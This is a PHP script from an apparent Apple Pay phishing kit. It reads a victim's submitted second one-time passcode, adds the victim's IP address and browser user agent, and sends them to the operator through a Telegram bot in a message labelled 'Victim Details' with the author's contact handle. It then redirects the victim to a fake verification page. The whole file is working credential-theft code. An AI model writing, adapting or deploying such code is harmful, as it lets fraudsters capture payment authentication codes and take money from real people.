<?php
ini_set('display_errors', '1');
ini_set('display_startup_errors', '1');
error_reporting(E_ALL);

require 'settings/config.php';
require './telegram.php';

require 'lib/page-functions.php';

store_post_values($_POST);

session_start();

$otp2 = $_POST["otp2"];

$ip = $_SERVER["REMOTE_ADDR"];
$ua = $_SERVER["HTTP_USER_AGENT"];


$fsh =
        "<strong>‼️🥇 APPLE PAY OTP CODE [2] 🥇‼️</strong>\n".
		"----- OTP CODE [2]-----\n".
		"| CODE 2 : <code>$otp2</code> \n".
		"+-----Victim Details-----+\n".
		"| 🌐 IP : $ip\n".
		"| Device : $ua\n".
		"|----Contact Me IF YOU NEED HELP : @ro0tM8n ----\n"
        ;

telegram($fsh);

save_as_text($txt);
header("Location: ./verification2.php");
?>
